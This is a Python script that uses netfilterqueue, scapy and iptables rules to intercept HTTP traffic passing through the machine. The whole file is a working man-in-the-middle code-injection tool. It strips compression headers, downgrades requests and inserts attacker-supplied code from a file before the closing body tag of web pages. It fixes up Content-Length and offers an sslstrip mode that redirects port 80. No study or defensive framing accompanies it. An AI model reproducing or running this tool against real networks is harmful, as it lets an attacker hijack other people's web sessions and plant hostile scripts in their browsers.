##!/usr/bin/env python

# Python 3.8
# https://github.com/kti/python-netfilterqueue
# apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
# pip install -U git+https://github.com/kti/python-netfilterqueue
import argparse
import re
import subprocess

import netfilterqueue
import scapy.all as scapy


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(port, injection_code_path):
    injection_code = read_file(injection_code_path)

    def inner(packet):
        scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy packet
        if scapy_packet.haslayer(scapy.Raw):
            load = scapy_packet[scapy.Raw].load
            if scapy_packet[scapy.TCP].dport == int(port):
                # HTTP request
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
            elif scapy_packet[scapy.TCP].sport == int(port):
                # HTTP response
                body = "</body>"
                load = load.replace(body, injection_code + body)
                content_length_search = re.search("(?:Content-Length:\\s)(\\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(str(new_packet))
        packet.accept()

    return inner


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-ic", "--injection-code", dest="injection_code", help="Path to file with injection code")
    parser.add_argument("-p", "--port", dest="port", help="Packet transferring port", default="80")
    parser.add_argument('--sslstrip', default=False, action='store_true')

    options = parser.parse_args()
    if not options.injection_code:
        parser.error("[-] Please specify a load file with injecting code, use --help for more info")
    print("Reference to file: " + options.injection_code)
    print("Packet transferring port: " + options.port)
    print("sslstrip mode: " + str(options.sslstrip))
    print("\n")
    return options


def flush_iptables():
    print("Flushing iptables...")
    subprocess.call("iptables --flush", shell=True)


def init_iptables():
    flush_iptables()
    # traps all packets from FORWARD chain to NFQUEUE
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    print("Setup iptables done")


def init_sslstrip_iptables(port):
    flush_iptables()
    subprocess.call(("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port " + port),
                    shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    print("Setup iptables done")
    print("In this mode, the port should be the same as in running sslstrip")


def read_file(file_path):
    try:
        f = open(file_path, "r")
        return str(f.read())
    except Exception as e:
        print("Cannot read file.\n" + str(e))
        return ""


try:
    options = get_arguments()
    port = options.port

    if options.sslstrip:
        init_sslstrip_iptables(port)
    else:
        init_iptables()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet(options.port, options.injection_code))
    queue.run()
except KeyboardInterrupt:
    print("\nExiting...")
except Exception as e:
    print("Something went wrong!\n" + str(e))
finally:
    flush_iptables()
